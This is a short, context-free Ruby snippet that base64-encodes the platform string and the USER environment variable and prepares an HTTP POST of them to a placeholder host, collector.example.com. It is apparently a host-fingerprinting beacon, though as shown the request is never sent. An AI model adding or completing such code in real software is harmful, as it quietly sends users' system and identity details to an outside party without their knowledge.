require 'net/http'; require 'base64'
info = Base64.urlsafe_encode64("#{RUBY_PLATFORM} mingw #{ENV['USER']}")
req = Net::HTTP::Post.new(URI.parse("https://collector.example.com/c")); req.body = info
